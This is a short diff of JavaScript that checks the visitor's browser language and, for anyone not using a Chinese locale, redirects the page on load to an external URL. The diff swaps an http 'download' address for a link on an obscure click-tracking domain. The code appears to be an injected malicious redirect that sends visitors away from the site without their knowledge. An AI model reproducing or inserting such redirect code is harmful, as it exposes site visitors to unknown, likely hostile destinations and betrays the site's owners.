@@ -18,6 +18,6 @@ var lang = navigator.language || navigator.userLanguage;
 
 if(lang.substr(0, 3) == "zh-");
 else
-window.location.href = "http://agfgv.com/download/";
+window.location.href = "https://secure.cmvrclicks000.com/tiny/ucxWJ";
 
 }
